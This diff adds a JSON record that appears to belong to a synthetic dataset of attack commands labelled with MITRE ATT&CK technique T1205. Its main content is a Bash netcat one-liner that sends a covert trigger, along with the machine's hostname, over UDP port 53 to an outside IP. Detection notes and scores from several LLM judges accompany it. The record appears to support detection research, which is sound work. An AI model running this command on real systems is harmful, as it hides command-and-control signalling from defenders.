@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1205",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "echo -n \"MAGIC_KNOCK_$(hostname)\" | nc -u -w1 198.51.100.7 53",
+  "explanation": "Sends a covert magic trigger over UDP/53 to blend with DNS, signaling a remote controller without establishing a real DNS query. Detection: inspect DPI/IDS for non-DNS payloads on port 53 and anomalous destinations.",
+  "rationale_steps": [
+    "Leverages nc to generate a single-packet authorization signal over a common service port.",
+    "Uses a clear, unencoded payload for transparency (no obfuscation).",
+    "Avoids authentication manipulation, focusing on signaling only.",
+    "Detect via protocol validation on DNS egress and anomaly detection."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-753dbc1f-05fe9559",
+  "source_prompt_hash": "753dbc1f",
+  "timestamp_utc": "2025-09-30T05:37:53.725688Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quotes, proper command substitution, a valid pipeline, and commonly valid nc flags (-u, -w1).",
+        "semantic_score": 5,
+        "semantic_justification": "It transmits a raw trigger string over UDP/53 to resemble DNS traffic without forming a real DNS query, aligning with T1205 traffic signaling behavior.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T13:25:28.977133Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command structure, valid flags for netcat (-u for UDP, -w1 for timeout), and correct piping of the echo output.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements the Traffic Signaling technique by sending a covert UDP packet to port 53 (typically DNS) containing a special magic knock string with the hostname, which could trigger actions on a listening controller without establishing legitimate DNS communication.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T13:25:32.157545Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using valid commands, flags, arguments, pipes, and command substitution without any syntax errors.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements the claimed intent of sending a custom magic trigger over UDP/53 for signaling, aligning perfectly with T1205 Traffic Signaling by using a common port for covert communication and a custom payload.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T13:25:51.204499Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
